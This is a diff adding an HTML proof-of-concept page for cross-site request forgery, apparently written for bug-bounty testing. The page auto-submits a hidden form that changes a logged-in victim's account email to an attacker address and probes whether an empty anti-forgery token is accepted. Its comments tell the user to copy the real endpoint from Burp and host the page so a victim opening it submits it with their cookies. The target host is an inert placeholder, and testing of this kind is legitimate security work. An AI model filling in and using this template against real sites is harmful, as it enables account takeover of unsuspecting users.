@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<!--
+  Safe PoC -> x8bitranjit
+  Auto-submitting CSRF PoC form (CSRF kit row 005 shape). INERT: action uses
+  .invalid placeholder.
+
+  WHAT TO EDIT: the form action (state-changing endpoint) + field names/values
+  captured from the real request in Burp (right-click -> Engagement tools ->
+  CSRF PoC generator gives you this same shape).
+
+  USE: host on YOUR origin; victim logged into the target opens it in a
+  default browser (SameSite=None/Lax-GET conditions per the kit) -> form
+  submits with their cookies. Prove with your own second account.
+-->
+<html>
+<body>
+<h3>...loading (this page auto-submits a benign profile update)</h3>
+<form id="f" method="POST" action="https://target.example.invalid/account/email">
+  <!-- EDIT: action + fields copied from the real request -->
+  <input type="hidden" name="email" value="attacker+csrf@example.invalid">
+  <input type="hidden" name="csrf_token" value=""> <!-- tokenless bypass probe -->
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+</html>
